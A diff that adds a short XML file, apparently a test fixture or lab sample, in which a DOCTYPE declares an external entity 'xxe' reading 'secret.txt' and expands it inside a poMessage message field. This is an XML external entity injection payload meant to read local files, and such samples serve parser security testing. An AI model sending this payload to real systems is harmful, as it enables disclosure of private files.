@@ -1,0 +1,17 @@
+<?xml version="1.0"?>
+
+<!DOCTYPE foo [
+
+    <!ENTITY xxe SYSTEM "secret.txt">
+
+]>
+
+<poMessage>
+
+    <from>yuri</from>
+
+    <to>christopherchristensen</to>
+
+    <message>&xxe;</message>
+
+</poMessage>
